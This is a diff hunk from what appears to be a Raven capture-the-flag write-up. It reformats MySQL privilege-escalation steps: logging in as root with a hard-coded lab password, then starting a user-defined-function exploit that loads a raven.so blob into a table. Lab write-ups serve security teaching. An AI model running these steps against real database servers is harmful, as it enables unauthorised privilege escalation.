@@ -56,7 +56,8 @@ we send this raven.so to attack machine
 
 ## 4.Privilege Escalation
 
-mysql -u root -p R@v3nSecurity
+```bash
+mysql -u root -p R@v3nSecurity```
 
 ```use mysql;```
 ```>>>create table raven(line blob);```
